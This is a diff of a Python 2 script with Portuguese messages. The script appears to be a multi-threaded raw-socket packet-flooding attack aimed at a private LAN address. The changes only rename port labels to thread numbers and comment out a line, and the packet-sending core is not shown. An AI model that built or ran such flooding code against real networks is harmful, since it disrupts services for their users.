@@ -35,12 +35,12 @@ def show_begin():
     print 'Inciando o ataque...\n\n'
     time.sleep(4) 
 
-def show_who(ip,porta):
+def show_who(ip,numero):
     print '----------------------------------------------------'
-    print ' O servidor ',ip,'esta sendo na Porta:',porta,
-    print '\n----------------------------------------------------\n'
+    print ' O servidor ',ip,'esta sendo pela thread ',numero
+    print '----------------------------------------------------\n'
 
-def attack(porta): 
+def attack(numero_thread): 
     #create a raw socket
     import time
 
@@ -64,7 +64,7 @@ def attack(porta):
     #source_ip = '192.168.0.17'
     #dest_ip = '192.168.0.101' # victor
     dest_ip = '192.168.0.1' # gabriel
-    show_who(dest_ip,porta)
+    show_who(dest_ip,numero_thread)
     # ip header fields
     ihl = 5
     version = 4
@@ -164,12 +164,11 @@ qnt = menu()
 print qnt
 
 ataque = []
-porta = 5000
 
 for i in range(0, qnt):
 	
-	ataque.append(Thread(target = attack, args = [porta]))
-	porta += 500
+	ataque.append(Thread(target = attack, args = [i]))
+	
 
 
 # ataque1 = Thread(target=attack,args=[5000])
@@ -187,4 +186,4 @@ for i in range (0, qnt):
 # ataque1.start()
 # ataque3.start()
 # ataque4.start()
-time.start()
+#time.start()
